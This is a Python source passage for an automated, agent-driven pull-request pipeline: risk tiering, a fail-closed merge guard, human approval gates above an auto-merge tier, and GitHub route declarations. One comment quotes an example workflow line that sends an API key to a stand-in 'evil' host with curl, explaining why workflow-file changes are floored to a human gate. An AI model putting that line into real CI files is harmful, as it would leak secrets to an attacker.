            if not (isinstance(decision, dict) and decision.get("resolved")):
                return {"state": "escalated",
                        "reason": "ci_agent_error" if ci_agent_error else "ci_exhausted",
                        "escalations": escalations}

    # A10/S11 — risk tiering (best-effort; never blocks). Conservative tier-3 default. The
    # guard tolerates BOTH a child failure (AgentError) AND a malformed/short return
    # (KeyError/ValueError/TypeError) so a flaky risk node can't discard a verified PR.
    phase("risk")
    tier = 3
    summary = "risk assessment unavailable"
    try:
        risk = await agent(
            {"task": "risk", "repo": repo, "pr_number": pr_number},
            agent_id=RISK_AGENT_ID, output_schema=RISK_SCHEMA, model=model, label="risk")
        tier = int(risk["tier"])
        summary = str(risk["summary"])
    except (AgentError, KeyError, ValueError, TypeError) as exc:
        log("risk assessment failed (non-blocking):", exc)
    # Deterministic security floor (#1185, broadened + fail-closed #1187): a PR touching ANY
    # .github/workflows file is a privileged-surface change that could exfiltrate the
    # provisioned secret on the next master push (e.g. `run: curl evil -d "$AIOS_API_KEY"` —
    # no literal `secrets.` needed), so it must NEVER auto-merge. Post-process the agent's
    # tier mechanically (tier = max(tier, 4)) rather than trusting the LLM to notice — the
    # risk node already has the PR, so fetch its changed files. FAIL CLOSED: if the files
    # fetch raises or returns a non-list we CANNOT prove the PR is workflow-free, so we floor
    # to tier-4 (require a human gate) instead of letting a flaky files call silently leave a
    # possibly-auto-merging tier standing. The floor is tier-4 (not 3) so the class stays
    # parked now that AUTO_MERGE_MAX_TIER is 3 (#1282/#1300). The floor can only RAISE the
    # tier, never lower it, and never blocks the run.
    try:
        files = _json_body(await gh("GET", _ipath(repo, "/pulls/%d/files" % pr_number)))
    except Exception as exc:  # noqa: BLE001 — fetch failure must fail CLOSED, not open
        log("risk floor files-fetch failed (failing closed to tier-4):", exc)
        files = None
    tier, floored_files = _risk_floor(tier, files)
    if floored_files:
        summary = ("%s\n\n_Risk floored to tier %d: this PR changes CI workflow file(s) "
                   "(%s) — a privileged surface that must clear a human gate before merge "
                   "(#1185/#1187). A files-fetch failure also floors here (fail closed)._"
                   % (summary, tier, ", ".join(floored_files)))
    await gh("POST", _ipath(repo, "/issues/%d/labels" % pr_number),
             {"labels": ["risk:tier-%d" % tier]})
    # Maker-marker dedup (aios#1292): skip the POST if the PR thread already carries the Risk
    # Assessment marker (an at-least-once replay re-driving this node).
    await post_markered_comment(repo, pr_number, MARKER_RISK_ASSESSMENT,
                                "%s\n\n**Tier %d**\n\n%s" % (MARKER_RISK_ASSESSMENT, tier, summary))

    # S12 — merge-ref guard (fail-closed; the one node that catches broken-on-merge)
    phase("merge-guard")
    guard = await tool("bash", {"command": _merge_guard_command(repo, pr_number),
                                "timeout_seconds": 600})
    guard_ok = isinstance(guard, dict) and guard.get("exit_code") == 0
    if not guard_ok:
        detail = "%s\n%s\nexit=%r" % (
            (guard.get("stdout", "") if isinstance(guard, dict) else "")[-1200:],
            (guard.get("stderr", "") if isinstance(guard, dict) else "")[-600:],
            guard.get("exit_code") if isinstance(guard, dict) else None)
        # Maker-marker dedup (aios#1292): a replay re-driving the failed-guard node must not
        # post a second "Merge guard refused" comment on the PR.
        await post_markered_comment(repo, pr_number, MARKER_MERGE_GUARD,
                                    "%s\n\n```\n%s\n```" % (MARKER_MERGE_GUARD, detail))
        escalations.append("merge_guard")
        decision = await gate({"kind": "merge_guard", "pr": pr_number, "detail": detail})
        if not (isinstance(decision, dict) and decision.get("proceed")):
            return {"state": "escalated", "reason": "merge_guard_refused",
                    "pr_url": pr_url, "pr_number": pr_number, "escalations": escalations}

    # S13 — mark the PR ready for review (best-effort; the merge step confirms non-draft)
    phase("mark-ready")
    if pr_node_id:
        await gh("POST", "/graphql",
                 {"query": _mark_ready_query(), "variables": {"id": pr_node_id}})

    # MERGE — executable delegated authority: tier<=N auto-merges; tier>N parks at a gate.
    phase("merge")
    if tier > AUTO_MERGE_MAX_TIER:
        escalations.append("merge_approval")
        decision = await human_gate({"kind": "merge_approval", "pr": pr_number, "tier": tier})
        if not (isinstance(decision, dict) and decision.get("approve")):
            return {"state": "held", "reason": "merge_approval", "pr_url": pr_url,
                    "pr_number": pr_number, "risk_tier": tier, "escalations": escalations}
    merge_resp = await gh("PUT", _ipath(repo, "/pulls/%d/merge" % pr_number),
                          {"merge_method": MERGE_METHOD})
    merged = _status(merge_resp) == 200
    # The merge PUT returns the merge commit's GitHub-canonical SHA-1 (issue #1178). Capture
    # it here so the post-merge master-CI watch can be handed a known-good SHA-1 instead of a
    # bare branch name (which a SHA-256 clone re-resolves to a 64-char id GitHub's REST API
    # rejects). On a confirm-only re-drive the merge body is absent, so fall back to merge_sha.
    _merge_body = _json_body(merge_resp)
    merge_sha = _merge_body.get("sha") if isinstance(_merge_body, dict) else None
    if not merged:
        # At-least-once: a crash-re-driven PUT against an already-merged PR returns 405/409.
        # Confirm against GitHub before declaring failure, so a real merge is never lost.
        confirm = _json_body(await gh("GET", _ipath(repo, "/pulls/%d" % pr_number)))
        if isinstance(confirm, dict) and confirm.get("merged"):
            merged = True
            if not merge_sha:
                merge_sha = confirm.get("merge_commit_sha")
        else:
            return await _fail(repo, issue_number,
                               {"state": "merge_failed", "pr_url": pr_url, "pr_number": pr_number,
                                "risk_tier": tier,
                                "reason": "merge call returned %r" % _status(merge_resp),
                                "escalations": escalations})

    # A15 — DONE on merge (issue #1176). The merge PUT is a committed fact: the issue is
    # resolved the moment it confirms, so release the in-progress claim and FIX the terminal
    # outcome to done HERE — before the advisory master-CI watch runs. Nothing the watch does
    # below can re-suspend or fail this completed run; a flaky watch agent can no longer
    # manufacture a false human gate that parks a finished run indefinitely.
    #
    # #1188 — the pipeline's PR bodies carry no `Closes #N` linkage, so GitHub never
    # auto-closes the source issue on merge: it would otherwise sit OPEN with stale
    # `autodev:in-progress` + `dispatched` claim labels, reading as in-flight to a
    # dispatch-gate sweep / rank-6 staleness reaper. Make the terminal cleanup explicit and
    # idempotent: strip BOTH claim labels (logged) and close the issue (state_reason:completed).
    # A re-drive that finds it already closed / labels already gone is a no-op, not an error.
    #
    # #1302 — the close is keyed on the KNOWN `issue_number` here, NEVER on the PR body's
    # `Closes #n` free text. #1298 merged but left #1292 OPEN because its body wrote "Closes
    # the ... class" as prose with no `#n` link, so GitHub's auto-close-via-keyword never
    # fired (the completion-marker-from-free-text antipattern). Closing on the structurally-
    # known issue_number removes that free-text dependency entirely; the `Closes #n` in the
    # body, when present, is a nicety we never rely on for the close.
    await _close_source_issue(repo, issue_number)
    result = {"state": "done", "pr_url": pr_url, "pr_number": pr_number, "merged": merged,
              "risk_tier": tier, "escalations": escalations}

    # A15b — post-merge master-CI watch, ADVISORY. On a genuinely-RED master we raise a
    # distinct "master_red" advisory; on an AgentError / malformed return we RETRY up to
    # MAX_MASTER_CI_ITERS, and only if STILL indeterminate raise a DISTINCT
    # "master_ci_indeterminate" advisory ("could not determine master state", NOT "master is
    # red"). Both are NON-blocking: each files a best-effort follow-up issue and is recorded in
    # result["advisories"] (telemetry that is provably distinct from a blocking gate-park in
    # result["escalations"]) — agent flakiness is NEVER coerced to the most-blocking outcome.
    phase("post-merge")
    # Resolve BASE_BRANCH to the GitHub-canonical SHA-1 ONCE, here in the workflow, and hand
    # that sha to the watch — never the bare branch name (issue #1178). The merge PUT already
    # returned the merge commit's SHA-1, so prefer it; otherwise ask GitHub to canonicalise
    # the branch. A SHA-256 clone re-resolving `master` locally yields a 64-char id GitHub's
    # REST check-runs endpoint rejects, hard-erroring the watch on a perfectly green master.
    master_sha = merge_sha if _is_sha1(merge_sha) else None
    if master_sha is None:
        master_sha = await _resolve_sha1(repo, BASE_BRANCH)
    master_status = None
    master_detail = ""
    if not _is_sha1(master_sha):
        # Regression guard: we could not obtain a SHA-1 for master, so we DO NOT dispatch the
        # watch with a branch name (the path that produced the SHA-256 error). Treat as a
        # non-blocking indeterminate — same advisory the retry-exhaustion path below files.
        master_detail = ("master-CI watch skipped: could not resolve %r to a GitHub SHA-1 "
                         "commit (merge_sha=%r)" % (BASE_BRANCH, merge_sha))
        log("master-CI watch indeterminate (non-blocking):", master_detail)
    else:
        for i in range(MAX_MASTER_CI_ITERS):
            try:
                master = await agent(
                    {"task": "watch_ci", "repo": repo, "ref": BASE_BRANCH,
                     "head_sha": master_sha},
                    agent_id=CI_AGENT_ID, output_schema=CI_SCHEMA, model=model,
                    label="master-ci-%d" % i)
                master_status = master["status"]
                master_detail = master.get("detail", "")
                break  # a well-formed verdict (green/red/no_ci) — no retry needed
            except (AgentError, KeyError, TypeError) as exc:
                master_detail = "master-CI watch failed: %s" % exc
                log("master-CI watch attempt %d indeterminate (non-blocking):" % i, exc)

    advisories = []
    if master_status == "red":
        advisories.append("master_red")
        result["advisories"] = advisories
        result["master_ci"] = "red"
        await _file_followup(
            repo, "Post-merge: master CI is RED after merging #%d" % issue_number,
            "Automated advisory from the dev-pipeline. The post-merge master-CI watch for "
            "`%s` reported **red** after merging PR #%d (issue #%d).\n\nThe merge is a "
            "committed fact and the run completed normally; this is a SEPARATE non-blocking "
            "signal that master may need attention.\n\n```\n%s\n```"
            % (BASE_BRANCH, pr_number, issue_number, master_detail))
    elif master_status is None:
        # Exhausted the bounded retries without a well-formed verdict: could not DETERMINE
        # master state. This is a distinct reason from "master is red" — we degrade to a
        # best-effort advisory and NEVER re-suspend the completed run.
        advisories.append("master_ci_indeterminate")
        result["advisories"] = advisories
        result["master_ci"] = "indeterminate"
        await _file_followup(
            repo, "Post-merge: master CI state INDETERMINATE after merging #%d" % issue_number,
            "Automated advisory from the dev-pipeline. The post-merge master-CI watch for "
            "`%s` could not be DETERMINED after merging PR #%d (issue #%d) — the watch agent "
            "errored or returned a malformed verdict on all %d attempts. This is NOT a red "
            "master; master state is simply unknown and should be checked.\n\n```\n%s\n```"
            % (BASE_BRANCH, pr_number, issue_number, MAX_MASTER_CI_ITERS, master_detail))
    else:
        result["master_ci"] = master_status  # "green" / "no_ci"

    return result
"""


def build_dev_pipeline_script(
    *,
    implement_agent_id: str = DEFAULT_IMPLEMENT_AGENT_ID,
    review_agent_id: str = DEFAULT_REVIEW_AGENT_ID,
    fix_agent_id: str = DEFAULT_FIX_AGENT_ID,
    ci_agent_id: str = DEFAULT_CI_AGENT_ID,
    risk_agent_id: str = DEFAULT_RISK_AGENT_ID,
    github_server: str = "github",
    base_branch: str = "master",
    merge_sentinels: list[str] | None = None,
    max_review_iters: int = 3,
    max_ci_iters: int = 3,
    auto_merge_max_tier: int = 2,
    merge_method: str = "squash",
    default_model: str | None = None,
) -> str:
    """Return the production dev-pipeline workflow source.

    Defaults match a standard deployment (named judgment agents, a ``github`` http server
    bound to ``https://api.github.com``, autodev's 3/3 iteration caps, and the delegated
    merge authority: tier ≤2 auto-merges, tier ≥3 parks at a gate). ``merge_sentinels`` is a
    list of shell commands run against the merge ref in the fail-closed guard; ``base_branch``
    is the repo's default branch.
    """
    header = _render_constants(
        implement_agent_id=implement_agent_id,
        review_agent_id=review_agent_id,
        fix_agent_id=fix_agent_id,
        ci_agent_id=ci_agent_id,
        risk_agent_id=risk_agent_id,
        github_server=github_server,
        base_branch=base_branch,
        merge_sentinels=merge_sentinels or [],
        max_review_iters=max_review_iters,
        max_ci_iters=max_ci_iters,
        auto_merge_max_tier=auto_merge_max_tier,
        merge_method=merge_method,
        default_model=default_model,
    )
    # Assemble the script by splicing four source strings, each authored once (module-level
    # defs resolve names at CALL time, so the order between body/lib/helpers is free):
    #   - _BODY: the imports + the state machine (``main``), which calls the lib helpers.
    #   - DEV_PIPELINE_LIB (STEP-0 extraction): the proven scripted/agentic helpers — spec gate,
    #     gh plumbing, SHA checks, merge-guard + rebase, risk floor, label/close plumbing,
    #     _ci_verdict/_shas_equal (aios#1392 Fix 2), _watch_ci/_sync_branch — factored out so the
    #     monolith AND the coming reconciler import one source of truth.
    #   - GH_BODY_HELPERS (aios#1294): _json_body / gh_paginated that fail LOUD on a truncated or
    #     unparseable-2xx body instead of degrading to None/[].
    #   - COMMENT_IDEMPOTENCY_HELPERS (aios#1292): the maker-marker comment-POST dedup.
    # The lib + helpers reference gh/_status/_headers/_link_next_page/_with_query/_ipath/log/
    # agent/gate/tool and the rendered constants from the body; appending after it is fine.
    return header + "\n" + _BODY + DEV_PIPELINE_LIB + GH_BODY_HELPERS + COMMENT_IDEMPOTENCY_HELPERS


def build_dev_pipeline_fixture_script(
    *,
    implement_agent_id: str,
    review_agent_id: str,
    fix_agent_id: str,
    ci_agent_id: str,
    risk_agent_id: str,
    max_review_iters: int = 2,
    max_ci_iters: int = 2,
    auto_merge_max_tier: int = 2,
) -> str:
    """The CI fixture variant: tight iteration caps (2/2) so the happy-path drive is short,
    real generated agent ids, otherwise the identical script shape."""
    return build_dev_pipeline_script(
        implement_agent_id=implement_agent_id,
        review_agent_id=review_agent_id,
        fix_agent_id=fix_agent_id,
        ci_agent_id=ci_agent_id,
        risk_agent_id=risk_agent_id,
        max_review_iters=max_review_iters,
        max_ci_iters=max_ci_iters,
        auto_merge_max_tier=auto_merge_max_tier,
    )


# ─── deploy surface (the tool + http_server envelope a WorkflowCreate needs) ──
#
# ``build_dev_pipeline_script`` returns only the workflow *script string*. A deployed
# workflow ALSO needs its tool + http_server surface declared on the ``WorkflowCreate``,
# or the very first ``tool('bash')`` / ``tool('http_request')`` call errors at runtime
# ("tool 'bash' is not in the workflow's declared tools"). Exporting the surface here
# alongside the script keeps the two from drifting (#1135).
#
# ``REQUIRED_TOOLS`` is the UNION of the script's own tools (``bash``/``http_request``)
# AND every named judgment agent's tools (``read``/``write``/``edit``/``glob``/``grep``).
# The child-agent surface is ``agent ∩ run`` (attenuation), so declaring only the
# script's two tools would strip the editing tools from the implement/fix agents and
# cripple them — the workflow must declare the union, each agent declaring its subset.
REQUIRED_TOOLS: list[ToolSpec] = [
    ToolSpec(type="bash"),
    ToolSpec(type="read"),
    ToolSpec(type="write"),
    ToolSpec(type="edit"),
    ToolSpec(type="glob"),
    ToolSpec(type="grep"),
    ToolSpec(type="http_request"),
]

# The GitHub http_server the scripted nodes reach via ``tool('http_request', ...)``.
# Two routes, because GraphQL and REST need distinct method scoping:
#   - ``/repos/**`` REST: GET·POST·PUT·DELETE·PATCH. DELETE is load-bearing — the
#     success-path ``_unlabel(autodev:in-progress)`` issues ``DELETE /repos/.../labels/...``;
#     omitting it silently fails every unlabel (route-mismatch, then 3 pointless retries).
#     PATCH is load-bearing too (#1208) — the post-merge ``_close_source_issue`` issues
#     ``PATCH /repos/.../issues/{n}`` to close the source issue; omitting it made the broker
#     reject the close (route-mismatch), so a merged issue stayed OPEN while its ``dispatched``
#     strip succeeded → re-armed the dispatch gate (a re-dispatch of already-merged work).
#   - ``/graphql`` POST: the mark-ready mutation (``_mark_ready_query``). GraphQL serves
#     reads and writes over one POST path, so it lives on its own route.


def _github_http_server(*, name: str, base_url: str) -> HttpServerSpec:
    return HttpServerSpec(
        name=name,
        base_url=base_url,
        description="GitHub REST + GraphQL API (auth resolved from the bound vault's GITHUB_TOKEN).",
        routes=[
            HttpRouteSpec(
                # PATCH is load-bearing (#1208): the post-merge cleanup closes the source
                # issue with PATCH /repos/.../issues/{n}. Omitting it made the broker reject
                # the close as a route-allowlist mismatch (a deterministic {"error": ...}) so
                # the close NEVER fired — the merged issue stayed OPEN while its `dispatched`
                # strip (a DELETE, which IS allowed) succeeded, re-arming the dispatch gate
                # (approved ∧ shovel-ready ∧ ¬dispatched) → a re-dispatch of already-merged work.
                path_pattern="/repos/**",
                methods=["GET", "POST", "PUT", "DELETE", "PATCH"],
                # allow_query: GitHub list endpoints paginate via ?per_page/?page, and the
                # comment-thread read must follow Link: rel="next" past the first 30 to not
                # silently drop late design/spec comments (#1156). Safe here — the route
                # already grants every verb, so a query string cannot escalate beyond it.
                allow_query=True,
                description="Issues, PRs, labels, statuses, refs (DELETE removes labels); "
                "list endpoints paginate via ?per_page/?page.",
            ),
            HttpRouteSpec(
                path_pattern="/graphql",
                methods=["POST"],
                description="GraphQL mutations (mark-ready: markPullRequestReadyForReview).",
            ),
        ],
    )


REQUIRED_HTTP_SERVERS: list[HttpServerSpec] = [
    _github_http_server(name="github", base_url="https://api.github.com")
]


def build_dev_pipeline_workflow_create(
    *,
    name: str,
    description: str | None = None,
    github_server: str = "github",
    github_base_url: str = "https://api.github.com",
    **script_kwargs: Any,
) -> WorkflowCreate:
    """Return the complete ``WorkflowCreate`` payload for the production dev-pipeline.

    Bundles the script (``build_dev_pipeline_script``) with the tool + http_server surface
    it requires (``REQUIRED_TOOLS`` and the two-route ``github`` http_server), so a deployer
    can POST one object instead of hand-assembling the surface from source — and so the
    declared surface can never drift from the script that needs it (#1135).

    ``github_server`` names the http_server and is threaded into the script's
    ``GITHUB_SERVER`` constant so ``tool('http_request', {server_ref: ...})`` resolves;
    ``github_base_url`` is the http_server's ``base_url`` (the credential-resolution key).
    Any remaining keyword args are forwarded verbatim to ``build_dev_pipeline_script``.
    """
    script = build_dev_pipeline_script(github_server=github_server, **script_kwargs)
    return WorkflowCreate(
        name=name,
        description=description,
        script=script,
        tools=list(REQUIRED_TOOLS),
        http_servers=[_github_http_server(name=github_server, base_url=github_base_url)],
    )
